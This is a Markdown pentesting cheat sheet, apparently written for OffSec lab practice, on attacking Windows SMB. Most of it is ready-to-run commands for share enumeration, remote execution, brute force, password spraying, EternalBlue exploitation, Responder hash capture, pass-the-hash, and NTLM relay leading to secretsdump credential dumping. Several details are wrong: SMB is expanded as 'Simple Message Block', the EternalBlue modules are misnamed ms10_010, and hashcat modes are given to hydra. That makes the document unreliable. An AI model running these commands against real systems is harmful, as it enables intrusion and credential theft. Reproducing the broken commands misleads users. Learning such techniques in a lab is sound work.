---
title: SMB
date: 2026-02-09T12:00:04+01:00
draft: false
tags:
  - offsec
  - windows
  - proving-grounds
  - netexec
  - enum4linux-ng
  - smbmap
  - smbclient
categories:
  - Pentesting
  - Offsec
  - Windows
description: A simple description and practical examples for the enumeration of the Simple Message Block protocal (SMB)
---
Simple Message Block (SMB) is a protocol for accessing/sharing files and communications between devices and systems on a network. On windows it can authenticate via the Kerberos and NTLM protocols. 


**Threats:**

Unauthenticated access to files/shares

smbmap:

`smbmap -H 192.168.1.20`  
`smbmap -H 192.168.1.20 -u username -p password`  
`smbmap -H 192.168.1.20 -d domain.com -u username -p password`  
`smbmap -H 192.168.1.20 -d domain.com -u username --prompt`  
`smbmap -H 192.168.1.20 -d domain.com -u username -r "SharedFiles"`  

smbclient:

`smbclient -L //192.168.1.20 -U username`  
`smbclient -L //192.168.1.20 -U "domain.com/username%password"`  
`smbclient -L //192.168.1.20/ShareFiles -U "domain.com/username%password"`  

netexec:

`nxc smb 192.168.1.20 -u "username" -p "password" --shares`  
`nxc smb 192.168.1.20 -u "" -p "" --shares`  
`nxc smb 192.168.1.20 -u "" -p "" --users`  
`nxc smb 192.168.1.20 -u "randomstring" -p "" --shares`  

**Remote Execution:**

(cmd) `nxc smb 192.168.1.20 -u "Administrator" -p "password" -x "whoami /priv"`  
(powershell) `nxc smb 192.168.1.20 -u "Administrator" -p "password" -X "whoami /priv"`  

**Brute force:**

Legba:  
`legba smb --target domain.local --username administrator --password wordlist.txt`  

**Password spaying:**

`nxc smb 192.168.1.20 -u "username" -p passwords.txt`  
`nxc smb ip.txt -u users.txt -p passwords.txt --continue-on-success`  

**SMBv1 EternalBlue:**

`nmap  -p 445 --script smb-vuln-ms17-010 192.168.1.20`  

**Metasploit**    
*Scanner*   
`use auxiliary/scanner/smb/ms10_010-eternalblue`  
`set rhosts 192.168.1.21`  
`run`  

*Exploit*   
`use exploit/windows/smb/ms10_010-eternalblue`  
`set rhosts 192.168.1.21`  
`run`  

![](Screenshot%202026-02-10%20at%2010.44.20.png)
#####  Net-NTLM v1/2 Capture Attack:
Respoder is able to capture the leaked Net-NTLM hash. 

Start a fake SMB server - `sudo responder -I tun0`  
Connect to the server via the victim machine(phish) - `dir //192.168.1.21`

`NTLMv1) hydra -m 5500 - a 3 hash.txt`  
`NTLMv2) hydra -m 5600 - a 3 hash.txt`  
`hydra -m 5600 - a 3 hash.txt --show`  

**Pass the Hash Attack(PTH):** 
Note* there is a difference between an NTLM and a Net-NTLM hash. 

`nxc smb 192.168.1.20 -u administrator -H 32AD87EB8C9876FA`  
`nxc smb 192.168.1.20 -u administrator -H 32AD87EB8C9876FA --shares`  
`nxc smb 192.168.1.20 -u administrator -H 32AD87EB8C9876FA -X "whoami"`  

`nxc smb 192.168.1.20 -u users.txt -H 32AD87EB8C9876FA --continue-on-success`  

**Net-NTLM Relay Attack:**
Signing must be disabled for this attack to work.

`nxc smb 192.168.1.20 --gen-relay-list smb_ips.txt`

`impacket-ntlmrelayx --no-http-server --smb2support -t smb://192.168.1.22 -socks`  
`dir //192.168.1.21` (from the victim machine, when this executes it will add the authenticated user to the socks, relaying the authentication)

`cd /usr/share/doc/python3-impacket/examples/`  

`proxychains lookupsid.py -no-pass -domain-sids username/administrator@192.168.1.22`    
`proxychains secretsdump.py -no-pass-domain-sids username/administrator@192.168.1.22`  
`proxychains smbexec.py -no-pass -domain-sids username/administrator@192.168.1.22`  